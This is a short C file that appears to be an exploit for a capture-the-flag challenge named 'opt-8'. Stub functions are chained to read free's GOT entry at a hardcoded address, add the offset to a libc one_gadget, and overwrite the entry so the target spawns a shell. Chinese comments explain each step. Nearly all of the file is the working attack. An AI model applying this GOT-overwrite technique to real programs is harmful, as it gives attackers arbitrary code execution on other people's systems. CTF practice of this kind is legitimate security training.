void o0o0o0o0();
void pop(int reg){};
void push(int reg){};
void store(int reg){};
void load(int reg){};
void add(int reg, int val){};
void min(int reg, int val){};

void o0o0o0o0(){
	add(1, 0x77E100); //opt-8程序中free函数got表的位置为0x77E100,*reg1=0x77E100
	load(1); //然后使用load函数将got表中地址值保存到另一个寄存器中,现在想要的地址在reg2,*reg2=**reg1
	add(2, 0x729ec); //libc.one_gadget-libc.free == 0x729ec,所以*reg2+=0x729ec=>libc.one_gadget
	store(1); //**reg1=*reg2
}

void sh(){};
